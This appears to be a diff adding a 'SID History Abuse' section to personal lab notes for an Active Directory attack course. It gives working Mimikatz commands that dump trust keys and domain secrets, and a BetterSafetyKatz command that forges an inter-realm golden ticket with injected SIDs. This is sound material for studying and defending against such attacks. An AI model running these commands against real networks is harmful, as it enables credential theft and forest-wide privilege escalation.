@@ -316,6 +316,37 @@ Rubeus.exe s4u /user:dcorp-student1$
 winrs -r:dcorp-mgmt cmd.exe
 ```
 
+---
+### SID History Abuse
+- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
+- sIDHistory can be abused in two ways of escalating privileges within a forest:
+	- krbtgt hash of the child
+	- Trust tickets
+
+![[Pasted image 20240123140717.png | 500]]
+
+#### Attack
+__Look for Trust Key__
+```powershell
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+```
+or
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\mcorp$"'
+```
+or
+```powershell
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+__Forge Inter-relam TGT__
+```powershell
+BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+```
+
+
+
+
 
 
 
